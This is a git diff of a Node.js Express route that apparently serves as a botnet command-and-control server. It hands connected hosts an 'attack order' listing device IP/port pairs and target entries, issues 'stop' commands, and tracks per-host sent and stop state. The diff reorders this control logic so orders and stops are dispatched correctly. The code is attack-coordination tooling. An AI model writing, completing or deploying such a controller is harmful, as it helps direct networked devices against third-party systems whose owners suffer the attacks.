@@ -64,38 +64,39 @@ app.post("/", function(req, res){
   {
       if(!attack) 
       {
-          console.log("OK");
-          res.end("ok");
-      } 
-      else //Known host 
-      {
-          //attack order not sent yet
-          if(knownIds[id].sent == false)
-          {
-            var content = {};
-            content.arduinos = ipPortPair;
-            content.targets = targetJson;
-            console.log("Content:");
-            console.log(content);
-            res.setHeader('Content-Type', 'application/json');
-            res.send(JSON.stringify(content));
-            knownIds[id].sent = true;
-          }
-          else
-          {
-            res.end("ok");
-          }
           if(stop)
           {
             if(knownIds[id].stop == false)
             {
               res.end("stop");
+              knownIds[id].stop = true;
+              knownIds[id].sent = false;
             }
             else
             {
+              console.log("OK");
               res.end("ok"); 
             }
           }
+      } 
+      else //Known host 
+      {
+            //attack order not sent yet
+            if(knownIds[id].sent == false)
+            {
+              var content = {};
+              content.arduinos = ipPortPair;
+              content.targets = targetJson;
+              console.log("Content:");
+              console.log(content);
+              res.setHeader('Content-Type', 'application/json');
+              res.send(JSON.stringify(content));
+              knownIds[id].sent = true;
+            }
+            else
+            {
+              res.end("ok");
+            }
       }
     
   }
